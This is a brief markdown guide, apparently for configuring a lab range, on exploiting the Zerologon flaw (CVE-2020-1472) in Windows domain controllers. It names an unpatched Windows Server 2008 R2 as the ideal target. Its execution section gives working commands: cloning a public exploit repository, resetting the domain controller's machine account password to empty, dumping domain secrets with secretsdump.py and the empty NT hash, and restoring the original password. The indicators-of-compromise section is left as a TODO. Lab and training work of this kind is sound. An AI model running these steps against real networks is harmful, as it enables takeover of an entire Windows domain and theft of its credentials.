# Zerologon (CVE-2020-1472)
## Summary

This vulnerability stems from a flaw in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This flaw allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on their behalf. 

## Prerequisites

This exploit requires at least one DC to be set up and configured. The DC *must* not have the patch, i.e. install the DC from before August 11th, 2020, or attempt to delete all of the KB security updates which may not work. **Windows Server 2008 R2 SP1** requires an ESU license for the patch to apply, which is atypical, making this version the ideal target for configuring a range with this vulnerability.

## Setup

If the prerequisites have been met, then any Zerologon exploit should work out of the box.

## Execution

### Method 1 - Changing DC's Machine Account Password

Clone the repository at https://github.com/risksense/zerologon, by either downloading the zip file or running the following command:

```bash
git clone https://github.com/risksense/zerologon
```

If there are any issues, update or reinstall impacket. Then, in the same directory as the cloned repository, run the following command:

```bash
python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR
```

Then, the DC's machine accounts hash is set to `31d6cfe0d16ae931b73c59d7e0c089c0`, and the old hash should be printed to the screen, note this for later. This can be used with impacket's pass-the-hash functionality. I.e. dumping secret:

```bash
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
```

To reinstall the old machine password, run the following command:

```bash
python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
```

#### Indicators of Compromise

TODO
